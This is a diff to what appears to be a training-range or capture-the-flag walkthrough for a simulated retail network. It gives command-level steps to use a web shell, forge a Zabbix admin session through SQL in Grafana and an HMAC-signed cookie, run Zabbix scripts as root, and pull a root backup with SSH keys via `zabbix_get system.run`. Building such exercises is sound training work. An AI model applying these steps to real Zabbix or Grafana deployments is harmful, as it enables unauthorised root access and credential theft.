@@ -26,11 +26,13 @@ Player path (perimeter-only start; steps 6–10 run from the web-shell pivot):
    WAF window) → `/upload/shell.php?z=<base64 cmd>` or the `/shell` terminal.
    You are `nginx` on `sp-web-p01`, inside the network — pivot.
 6. **Grafana → Zabbix → root.** `http://grafana.atbmarket.com:3000`, log in with
-   the edu creds. In Explore: `SELECT session_key FROM config`, then
-   `INSERT INTO sessions (sessionid,userid,lastaccess,status,secret) VALUES ('<32hex>',1,UNIX_TIMESTAMP(),0,'')`.
+   the edu creds. In Explore (Zabbix DB): `SELECT session_key FROM config`, then
+   `INSERT INTO sessions (sessionid,userid,lastaccess,status) VALUES ('<32hex>',1,UNIX_TIMESTAMP(),0)`.
    Cookie: `zbx_session = base64('{"sessionid":"<sid>","sign":"<hmac>"}')`,
-   `sign = HMAC-SHA256(session_key, '{"sessionid":"<sid>"}')`. Zabbix →
-   Administration → Scripts → create & run → root on `zb-app-p01`.
+   `sign = HMAC-SHA256(session_key, '{"sessionid":"<sid>"}')`, then open
+   `http://zabbix.atbmarket.com:8080` → Admin. (Or use `<sid>` as the JSON-RPC
+   `auth` token.) Administration → Scripts → create, *Execute on: Zabbix
+   server* → run it from a host's menu → root on `zb-app-p01`.
 7. **Keys.** Jenkins' agent only answers zb-app-p01, so from a Zabbix script:
    `zabbix_get -s jenkins.atbmarket.com -k 'system.run[base64 -w0 /mnt/BACKUP/root.tar.gz]'`
    (`/etc/fstab` on jenkins names the CIFS share). Decode → `id_rsa_root`,
